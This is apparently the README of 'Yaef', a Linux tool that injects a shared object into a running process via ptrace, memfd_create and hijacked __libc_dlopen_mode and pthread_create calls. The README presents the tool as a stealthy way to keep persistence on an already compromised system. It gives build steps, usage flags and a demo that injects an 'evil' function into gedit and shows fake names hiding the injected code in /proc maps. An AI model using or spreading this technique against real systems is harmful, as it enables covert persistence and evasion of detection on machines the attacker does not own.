# Yaef - Yet Another ELF-Injector
Yaef injects an ELF x86_64 shared object into a remote process, and makes 
it run as an independent thread. If specified, it can be used a fake name,
thus deceiving /proc/maps.

Overall, It's a pretty stealthy and complete solution to gain persistence in a
already compromised system. 

### How does it work
 1. Attach & stop all running threads ([Ptrace](https://www.kernel.org/doc/Documentation/security/Yama.txt))
 2. Create a memory file based on the binary ([memfd_create](http://man7.org/linux/man-pages/man2/memfd_create.2.html))
 3. Hijack remote **__libc_dlopen_mode()** function and load the memfd file.
 4. Hijack remote **pthread_create()** function and call our malicious one.

## Install
``` 
git clone https://github.com/0xN3utr0n/Yaef.git
cd Yaef
make 
```

## Usage
```
Usage: ./Yaef <option> <value>...

	-p	Target process id
	-b	Elf binary path
	-f	Elf binary function's name
	-n	File fake name (optional)
```
## Demo

**shell1>** ./Yaef -p $(pidof gedit) -f main -b ./dummy -n fakename1
```	
	#### YAEF ####

[*]0x7f32b8e88450 <- __libc_dlopen_mode()
[*]0x000000000630 <- main() offset
[*]Valid ELF binary
[*]Thread 2365 stopped
[*]Thread 2366 stopped
[*]Thread 2367 stopped
[*]Thread 2368 stopped
[*]Thread 2370 stopped
[*]Attached!
[*]0x7f32a8002000 <- String Injected!
[*]0x7f3299e22000 <- 'fakename1' Injected!
[*]0x7f32b5eb49b0 <- pthread_create()
```
**shell2>** gedit
```
//few seconds later...

Main function

Main function

Main function

Main function

Main function

Main function
```
And if we were to inject more binaries? </br>
**shell1>** ./Yaef -p $(pidof gedit) -f evil -b ./dummy -n fakename2
```
	#### YAEF ####

[*]0x7f32b8e88450 <- __libc_dlopen_mode()
[*]0x000000000780 <- evil() offset
[*]Valid ELF binary
[*]Thread 2365 stopped
[*]Thread 2366 stopped
[*]Thread 2367 stopped
[*]Thread 2368 stopped
[*]Thread 2375 stopped
[*]Attached!
[*]0x7f32a8000000 <- String Injected!
[*]0x7f3298ca0000 <- 'fakename2' Injected!
[*]0x7f32b5eb49b0 <- pthread_create()
```
**shell2>** gedit
```
Main function

Main function
...
...
//few seconds later...
Evil function !!!

Main function

Evil function !!!

Evil function !!!

Main function
```
**shell3>** cat /proc/$(pidof gedit)/maps 
```
555e8fb70000-555e8fb72000 r-xp 00000000 fc:01 1704296                    /usr/bin/gedit
555e8fd71000-555e8fd72000 r--p 00001000 fc:01 1704296                    /usr/bin/gedit
555e8fd72000-555e8fd73000 rw-p 00002000 fc:01 1704296                    /usr/bin/gedit
555e90326000-555e9104c000 rw-p 00000000 00:00 0                          [heap]
...
...
7f3298ca0000-7f3298ca1000 r-xp 00000000 00:05 65193                      /memfd:fakename2 (deleted) 
7f3298ca1000-7f3298ea0000 ---p 00001000 00:05 65193                      /memfd:fakename2 (deleted)
7f3298ea0000-7f3298ea1000 r--p 00000000 00:05 65193                      /memfd:fakename2 (deleted)
7f3298ea1000-7f3298ea2000 rw-p 00001000 00:05 65193                      /memfd:fakename2 (deleted)
...
...
...
7f3299e22000-7f3299e23000 r-xp 00000000 00:05 62901                      /memfd:fakename1 (deleted)
7f3299e23000-7f329a022000 ---p 00001000 00:05 62901                      /memfd:fakename1 (deleted)
7f329a022000-7f329a023000 r--p 00000000 00:05 62901                      /memfd:fakename1 (deleted)
7f329a023000-7f329a024000 rw-p 00001000 00:05 62901                      /memfd:fakename1 (deleted)
```

